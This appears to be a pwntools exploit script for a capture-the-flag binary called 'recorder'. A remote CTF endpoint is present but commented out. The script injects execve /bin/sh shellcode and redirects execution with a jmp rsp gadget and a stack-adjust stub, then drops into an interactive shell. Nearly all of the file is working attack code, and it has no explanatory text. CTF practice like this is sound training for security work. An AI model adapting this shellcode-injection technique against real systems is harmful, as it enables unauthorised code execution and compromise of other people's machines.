from pwn import *

p = process('./recorder')
#r = remote('ctf.adl.tw', 11003) 
#context.arch = 'amd64'
raw_input()
#p.recv()
#p.recvline()
#p.recvuntil()
shellcode = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

#shellcode = shellcraft.linux.sh()

#asm = asm('sub rsp, 32')
#jump rsp


p.send(p32(0xe4ff))  #jmp rsp

p.send(shellcode + p64(0x601048) + p32(0x20ec8348) + p32(0xe4ff9090)) #shellcode + 首次input + rsp-32 + jump rsp

#"\x48\x83\xEC\x20"
							
#p.sendline()
#p.sendafter()

p.interactive()
